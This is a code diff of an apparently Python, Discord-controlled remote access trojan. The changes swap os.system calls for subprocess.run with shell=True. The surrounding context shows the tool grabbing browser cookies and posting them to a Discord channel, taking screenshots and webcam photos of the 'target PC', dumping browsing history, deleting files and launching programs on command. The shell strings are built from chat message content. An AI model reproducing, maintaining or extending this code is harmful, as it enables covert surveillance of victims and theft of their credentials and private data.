@@ -186,7 +186,7 @@ async def on_ready():
                 await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                 await asyncio.sleep(0.1)
                 if file[3]:
-                    os.system('del ' + file[2])
+                    subprocess.run('del ' + file[2], shell=True)
             files_to_send = []
         if len(embeds_to_send) > 0:
             for embedd in embeds_to_send:
@@ -196,8 +196,8 @@ async def on_ready():
         if os.path.exists('ready.cookies') and cookies_thread != None:
             await asyncio.sleep(1)
             reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File('cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
-            os.system('del cookies.txt')
-            os.system('del ready.cookies')
+            subprocess.run('del cookies.txt', shell=True)
+            subprocess.run('del ready.cookies', shell=True)
             cookies_thread = None
         await asyncio.sleep(1)
 
@@ -229,7 +229,7 @@ async def on_reaction_add(reaction, user):
                                 try: await i.delete()
                                 except: pass
                             tree_messages = []
-                            os.system('del tree.txt')
+                            subprocess.run('del tree.txt', shell=True)
                         elif reaction.message.content == '```End of command stdout```':
                             for i in cmd_messages:
                                 await i.delete()
@@ -246,7 +246,7 @@ async def on_reaction_add(reaction, user):
                     case '📥':
                         if reaction.message.content[:15] == '```End of tree.':
                             await reaction.message.channel.send(file=discord.File('tree.txt'))
-                            os.system('del tree.txt')
+                            subprocess.run('del tree.txt', shell=True)
 
                     case '✅':
                         if len(messages_from_sending_big_file) > 1:
@@ -347,7 +347,7 @@ async def on_message(message):
                 await message.delete()
                 ImageGrab.grab(all_screens=True).save('ss.png')
                 reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
-                os.system('del ss.png')
+                subprocess.run('del ss.png', shell=True)
 
             elif message.content == '.join':
                 await message.delete()
@@ -500,7 +500,7 @@ async def on_message(message):
                         if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                             try:
                                 if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
-                                    os.system('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"')
+                                    subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                                 else:
                                     rmtree('/'.join(working_directory) + '/' + message.content[8:])
                                 reaction_msg = await message.channel.send('```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```'); await reaction_msg.add_reaction('🔴')
@@ -599,7 +599,7 @@ async def on_message(message):
                             for entry in get_history().histories:
                                 history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
                         reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
-                        os.system('del history.txt')
+                        subprocess.run('del history.txt', shell=True)
                     
                     elif message.content[6:] == 'cookies':
                         if cookies_thread == None:
@@ -650,11 +650,11 @@ async def on_message(message):
                     else:
                         if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                             try:
-                                os.system('start ' + '/'.join(working_directory) + '/' + message.content[9:])
+                                subprocess.run('start ' + '/'.join(working_directory) + '/' + message.content[9:], shell=True)
                                 await asyncio.sleep(1)
                                 ImageGrab.grab(all_screens=True).save('ss.png')
                                 reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
-                                os.system('del ss.png')
+                                subprocess.run('del ss.png', shell=True)
                                 await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                             except:
                                 reaction_msg = await message.channel.send('```❗ Something went wrong...```'); await reaction_msg.add_reaction('🔴')
@@ -695,7 +695,7 @@ async def on_message(message):
                         result, image = webcam.read()
                         imwrite('webcam.png', image)
                         reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
-                        os.system('del webcam.png')
+                        subprocess.run('del webcam.png', shell=True)
                     else:
                         reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```'); await reaction_msg.add_reaction('🔴')
 
